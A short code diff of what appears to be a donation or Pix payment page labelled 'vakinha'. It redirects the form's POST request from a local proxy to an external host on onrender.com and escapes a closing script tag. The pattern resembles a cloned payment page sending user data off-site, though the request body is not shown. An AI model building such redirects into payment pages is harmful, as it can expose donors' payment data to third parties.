@@ -373,7 +373,7 @@
     erro.style.display = 'none';
 
     try {
-      var resp = await fetch('../proxy.php', {
+      var resp = await fetch('https://vakinha-js-v3.onrender.com/proxy.php', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
@@ -469,7 +469,7 @@
     document.getElementById('telaPix').style.display = 'none';
     document.getElementById('telaSucesso').style.display = 'block';
   }
-</script>
+<\/script>
 
 </body>
 </html>
